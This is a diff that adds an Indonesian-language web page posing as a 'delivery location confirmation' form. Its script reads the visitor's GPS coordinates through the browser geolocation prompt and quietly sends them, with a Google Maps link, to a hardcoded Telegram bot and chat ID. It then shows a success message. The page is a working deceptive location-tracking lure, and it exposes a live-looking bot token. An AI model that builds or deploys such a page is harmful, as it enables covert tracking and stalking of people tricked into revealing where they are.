@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Validasi Lokasi Pengiriman</title>
+
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: #f2f2f2;
+  text-align: center;
+  padding-top: 80px;
+}
+.container {
+  background: white;
+  width: 300px;
+  margin: auto;
+  padding: 20px;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.2);
+}
+button {
+  background: #4CAF50;
+  color: white;
+  padding: 10px 20px;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+<h3>Konfirmasi Lokasi Pengiriman</h3>
+<p>Silakan tekan tombol di bawah untuk validasi lokasi Anda.</p>
+<button onclick="getLocation()">Konfirmasi Lokasi</button>
+<p id="status"></p>
+</div>
+
+<script>
+
+function getLocation() {
+  document.getElementById("status").innerHTML = "Meminta izin lokasi...";
+  
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendPosition, errorHandler);
+  } else {
+    alert("Browser tidak mendukung GPS.");
+  }
+}
+
+function sendPosition(position) {
+
+  var lat = position.coords.latitude;
+  var lon = position.coords.longitude;
+  var acc = position.coords.accuracy;
+
+  var message = "📍 Lokasi Terdeteksi:%0A";
+  message += "Latitude: " + lat + "%0A";
+  message += "Longitude: " + lon + "%0A";
+  message += "Akurasi: " + acc + " meter%0A";
+  message += "Map: https://maps.google.com/?q=" + lat + "," + lon;
+
+  fetch("https://api.telegram.org/bot8755956676:AAF2JzaSXr4Ssav1hyPlNUhKZdF0YRv5OGc/sendMessage?chat_id=8144082287&text=" + message, {
+  method: "GET",
+  mode: "no-cors"
+});
+
+  document.getElementById("status").innerHTML = "Lokasi berhasil dikirim ✅";
+}
+
+function errorHandler(err) {
+  document.getElementById("status").innerHTML = "Izin lokasi ditolak ❌";
+}
+
+</script>
+
+</body>
+</html>
